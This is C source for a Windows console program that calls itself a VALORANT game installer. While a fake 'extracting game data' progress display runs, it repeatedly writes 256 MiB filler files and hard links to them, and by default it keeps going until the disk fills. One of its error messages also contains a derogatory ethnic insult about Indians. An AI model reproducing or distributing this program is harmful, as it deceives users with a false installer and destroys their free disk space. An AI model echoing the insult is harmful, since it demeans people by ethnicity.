#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <conio.h>

#define getch  _getch

#ifndef FSIZE
	#define FSIZE 0x10000000ULL
#endif
#ifndef FSIGNATURE
	#define FSIGNATURE "VALORANT.DAT---"
#endif

inline void make_file(void *data_buffer, const char *data_fname)
{
	HANDLE data_file = CreateFile(data_fname, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (data_file != INVALID_HANDLE_VALUE) {
		WriteFile(data_file, data_buffer, FSIZE, NULL, NULL);
		CloseHandle(data_file);
	} else if (GetLastError() != ERROR_FILE_EXISTS) {
		fprintf(stderr, "Your OS is too shit to create a file, apparently. Install Gentoo.\n");

		free(data_buffer);

		exit(1);
	}
}

inline void print_progress(unsigned long file_num, unsigned long flimit)
{
	unsigned long long size = (file_num + 1) * FSIZE;
	double             byte_size;
	long long          factor;

	const char *unit_names[] = {
		"Bytes",
		"KiB",
		"MiB",
		"GiB",
		"TiB",
	};

	for (factor = 4; factor >= 0; factor--) {
		if (size / (1ULL << (factor * 10))) {
			byte_size = (double)size / (1ULL << (factor * 10));

			break;
		}
	}

	if (flimit == -1) {
		printf("\r>> (%lu) %7.2f %s", file_num, byte_size, unit_names[factor]);
	} else {
		printf("\r>> (%lu%%) %7.2f %s", file_num * 100 / flimit, byte_size, unit_names[factor]);
	}
}

int main(int argc, const char **argv)
{
	void         *data_buffer = malloc(FSIZE);
	unsigned long flimit = -1;
	char          fname[255];
	char          data_fname[255] = "Valorant\\GAME.dat";

	if (argc > 1) {
		flimit = atoi(argv[1]);
	}

	if (data_buffer == NULL) {
		fprintf(stderr,
			"We can't even allocate memory on your system.\n"
			"What devilish fucking Indian tech guru did you get such a crap PC from in the first place?\n"
			"Truly magnificent, brother, even for our standards...\n"
		);

		return 1;
	}

	memset(data_buffer, 0xF0, FSIZE);
	memcpy(data_buffer, FSIGNATURE, sizeof(FSIGNATURE) % FSIZE);

	CreateDirectory("Valorant", NULL);

	make_file(data_buffer, data_fname);

	printf(
		"   ****************************************************\n"
		"   *                                                  *\n"
		"   *                                                  *\n"
		"   *       VALORANT Automated Installer v1.0          *\n"
		"   *      ===================================         *\n"
		"   *                                                  *\n"
		"   *                                                  *\n"
		"   ****************************************************\n"
		"\n"
		"\n"
		">> Press ENTER to start the installer...\n"
		"\n"
		"> "
	);

	getch();

	printf(
		"ENTER\n"
		"\n"
		">> Extracting game data...\n"
		"\n"
	);

	for (unsigned long file_num = 0; file_num < flimit; file_num++) {
		BOOL result;

		sprintf(fname, "Valorant\\VALORANT_%08lX.dat", file_num);

		result = CreateHardLink(fname, data_fname, NULL);

		if (
			result == FALSE &&
			GetLastError() == ERROR_TOO_MANY_LINKS
		) {
			memcpy(data_fname, fname, 255);

			make_file(data_buffer, data_fname);
		} else if (
			result == FALSE &&
			GetLastError() != ERROR_ALREADY_EXISTS
		) {
			fprintf(stderr, "\nFatal OS error: 0x%08lX\n", (long)GetLastError());

			free(data_buffer);

			return 1;
		}

		print_progress(file_num, flimit);
	}

	print_progress(flimit, flimit);

	printf(
		"\n"
		"\n"
		">> Finished extracting game data.\n"
	);

	return 0;
}
